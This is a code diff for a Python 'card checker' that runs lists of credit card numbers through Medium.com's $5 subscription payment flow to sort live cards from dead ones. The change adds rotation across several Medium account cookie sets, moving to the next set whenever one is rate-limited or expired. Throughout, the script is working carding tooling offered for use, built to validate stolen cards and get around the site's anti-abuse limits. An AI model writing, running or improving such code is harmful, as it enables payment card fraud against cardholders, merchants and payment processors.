@@ -1,6 +1,6 @@
 """
 Medium.com Card Checker for Pydroid3
-Full $5 Charge Gate with Cookie Authentication
+Full $5 Charge Gate with Multiple Cookie Rotation
 """
 
 import requests
@@ -47,25 +47,65 @@ def get_bin_info(cc):
         pass
     return f"BIN: {cc[:6]}"
 
-def load_cookies():
-    """Load cookies from cookies.txt"""
+def parse_cookie_dict(text):
+    """Parse Python dict format cookies"""
     cookies = {}
     
+    # Find all 'key': 'value' patterns
+    pattern = r"['\"]([^'\"]+)['\"]\s*:\s*['\"]([^'\"]+)['\"]"
+    matches = re.findall(pattern, text)
+    
+    for key, value in matches:
+        cookies[key] = value
+    
+    return cookies
+
+def load_all_cookies():
+    """Load multiple cookie sets from cookies.txt"""
+    
     if not os.path.exists(COOKIE_FILE):
-        return None
+        return []
     
     with open(COOKIE_FILE, 'r') as f:
-        content = f.read().strip()
+        content = f.read()
     
-    # Parse cookie string format: name=value; name2=value2
-    if '=' in content:
-        for part in content.replace('\n', ';').split(';'):
-            part = part.strip()
-            if '=' in part:
-                key, val = part.split('=', 1)
-                cookies[key.strip()] = val.strip()
+    cookie_sets = []
     
-    return cookies if cookies else None
+    # Split by "cookies = {" or empty lines between dict blocks
+    # Find all cookie dict blocks
+    blocks = re.split(r'\n\s*\n', content)
+    
+    for block in blocks:
+        block = block.strip()
+        
+        # Skip comments and empty blocks
+        if not block or block.startswith('#'):
+            continue
+        
+        # Skip if it's headers or json_data block
+        if 'headers' in block.lower() and 'authority' in block:
+            continue
+        if 'json_data' in block.lower():
+            continue
+        if 'operationName' in block:
+            continue
+        
+        # Check if it contains cookie data
+        if 'uid' in block and 'sid' in block:
+            cookies = parse_cookie_dict(block)
+            if cookies and 'uid' in cookies and 'sid' in cookies:
+                cookie_sets.append(cookies)
+    
+    # Remove duplicates based on uid
+    seen_uids = set()
+    unique_sets = []
+    for cookies in cookie_sets:
+        uid = cookies.get('uid', '')
+        if uid and uid not in seen_uids:
+            seen_uids.add(uid)
+            unique_sets.append(cookies)
+    
+    return unique_sets
 
 def get_medium_session(cookies):
     """Create session with Medium cookies"""
@@ -77,7 +117,7 @@ def get_medium_session(cookies):
     
     return session
 
-def get_payment_intent(session):
+def get_payment_intent(session, cookies):
     """Get payment intent from Medium for $5 monthly subscription"""
     
     headers = {
@@ -96,7 +136,7 @@ def get_payment_intent(session):
     }
     
     # Get XSRF token from cookies
-    xsrf = session.cookies.get('xsrf', '')
+    xsrf = cookies.get('xsrf', '')
     if xsrf:
         headers['x-xsrf-token'] = xsrf
     
@@ -272,7 +312,7 @@ def parse_confirm_response(response):
     
     return 'UNKNOWN', f"Status: {status}"
 
-def check_card(session, cc, mes, ano, cvv):
+def check_card(cookies, cc, mes, ano, cvv):
     """
     Full card check flow:
     1. Get payment intent from Medium
@@ -290,8 +330,11 @@ def check_card(session, cc, mes, ano, cvv):
     muid = generate_muid()
     sid = generate_sid()
     
+    # Create session with cookies
+    session = get_medium_session(cookies)
+    
     # Step 1: Get payment intent
-    pi_id, client_secret, error = get_payment_intent(session)
+    pi_id, client_secret, error = get_payment_intent(session, cookies)
     
     if error:
         return 'ERROR', f"PI Error: {error}"
@@ -338,37 +381,44 @@ def main():
     ╔═══════════════════════════════════════╗
     ║      MEDIUM.COM CARD CHECKER          ║
     ║         FOR PYDROID3                  ║
-    ║     $5 CHARGE GATE with Cookies       ║
+    ║   $5 CHARGE - MULTI COOKIE ROTATION   ║
     ╚═══════════════════════════════════════╝
     """)
     
-    # Check cookies
-    cookies = load_cookies()
-    if not cookies:
-        print(f"[!] {COOKIE_FILE} not found or empty!")
+    # Load all cookie sets
+    all_cookies = load_all_cookies()
+    
+    if not all_cookies:
+        print(f"[!] No cookies found in {COOKIE_FILE}!")
         print(f"\n[*] Creating {COOKIE_FILE}...")
         with open(COOKIE_FILE, 'w') as f:
-            f.write("# Paste your Medium cookies here\n")
-            f.write("# Format: uid=xxx; sid=xxx; xsrf=xxx\n")
-            f.write("# \n")
-            f.write("# How to get cookies:\n")
-            f.write("# 1. Login to medium.com on browser\n")
-            f.write("# 2. Open DevTools (F12) > Application > Cookies\n")
-            f.write("# 3. Copy: uid, sid, xsrf values\n")
-            f.write("# Example:\n")
-            f.write("# uid=abc123; sid=1:xyz789; xsrf=token123\n")
-        print(f"[*] Please add cookies to {COOKIE_FILE} and run again.")
-        print("\n[*] Required cookies: uid, sid, xsrf")
+            f.write("""# Paste your Medium cookies here
+# You can add multiple cookie sets - they will be rotated
+
+# === COOKIE SET 1 ===
+cookies = {
+    'uid': 'your_uid_here',
+    'sid': 'your_sid_here',
+    'xsrf': 'your_xsrf_here',
+}
+
+# === COOKIE SET 2 ===
+cookies = {
+    'uid': 'another_uid',
+    'sid': 'another_sid',
+    'xsrf': 'another_xsrf',
+}
+
+# Add more cookie sets below...
+""")
+        print(f"[*] Please add cookies to {COOKIE_FILE}")
+        print("[*] You can add multiple cookie sets for rotation!")
         return
     
-    print(f"[+] Cookies loaded: {', '.join(cookies.keys())}")
-    
-    # Check required cookies
-    required = ['uid', 'sid']
-    missing = [c for c in required if c not in cookies]
-    if missing:
-        print(f"[!] Missing required cookies: {', '.join(missing)}")
-        return
+    print(f"[+] Loaded {len(all_cookies)} cookie set(s)")
+    for i, cookies in enumerate(all_cookies, 1):
+        uid = cookies.get('uid', 'N/A')[:8]
+        print(f"    [{i}] uid: {uid}...")
     
     # Check cards.txt
     if not os.path.exists(INPUT_FILE):
@@ -395,11 +445,9 @@ def main():
         print("[!] No valid cards in cards.txt")
         return
     
-    # Create session
-    session = get_medium_session(cookies)
-    
     print(f"\n[*] Loaded {len(cards)} cards")
     print(f"[*] Gate: Medium $5 Monthly Charge")
+    print(f"[*] Cookie Rotation: {len(all_cookies)} accounts")
     print(f"[*] Delay: {DELAY}s")
     print("=" * 50)
     
@@ -408,6 +456,8 @@ def main():
     ccn = 0
     dead = 0
     errors = 0
+    
+    cookie_index = 0
     
     for i, card in enumerate(cards, 1):
         parts = card.split('|')
@@ -418,10 +468,14 @@ def main():
         
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
         
-        print(f"\n[{i}/{total}] {cc[:6]}xxxxxx{cc[-4:]}")
+        # Get current cookie set (rotation)
+        current_cookies = all_cookies[cookie_index]
+        cookie_uid = current_cookies.get('uid', 'N/A')[:8]
+        
+        print(f"\n[{i}/{total}] {cc[:6]}xxxxxx{cc[-4:]} [Cookie: {cookie_uid}...]")
         
         start = time.time()
-        status, message = check_card(session, cc, mes, ano, cvv)
+        status, message = check_card(current_cookies, cc, mes, ano, cvv)
         elapsed = round(time.time() - start, 2)
         
         bin_info = get_bin_info(cc)
@@ -441,8 +495,11 @@ def main():
             save_result(fullcc, status, message)
             
         elif status == 'RATE_LIMIT':
-            print(f"[!] Rate Limited - waiting 60s...")
-            time.sleep(60)
+            print(f"[!] Rate Limited on cookie {cookie_uid}")
+            # Try next cookie
+            cookie_index = (cookie_index + 1) % len(all_cookies)
+            print(f"[*] Switching to next cookie...")
+            time.sleep(5)
             errors += 1
             
         elif status == 'ERROR':
@@ -451,9 +508,16 @@ def main():
             errors += 1
             
             # Check if cookie expired
-            if 'unauthorized' in message.lower() or 'login' in message.lower():
-                print("\n[!] Cookie expired! Please update cookies.txt")
-                break
+            if 'unauthorized' in message.lower() or 'login' in message.lower() or 'not authenticated' in message.lower():
+                print(f"[!] Cookie {cookie_uid} expired!")
+                # Remove this cookie and try next
+                if len(all_cookies) > 1:
+                    all_cookies.pop(cookie_index)
+                    cookie_index = cookie_index % len(all_cookies)
+                    print(f"[*] Switching to next cookie ({len(all_cookies)} remaining)")
+                else:
+                    print("[!] No more valid cookies!")
+                    break
             
         else:
             print(f"[DEAD] {fullcc}")
@@ -462,6 +526,9 @@ def main():
             save_result(fullcc, status, message)
         
         print(f"[*] {elapsed}s")
+        
+        # Rotate to next cookie for next card
+        cookie_index = (cookie_index + 1) % len(all_cookies)
         
         if i < total:
             time.sleep(DELAY)
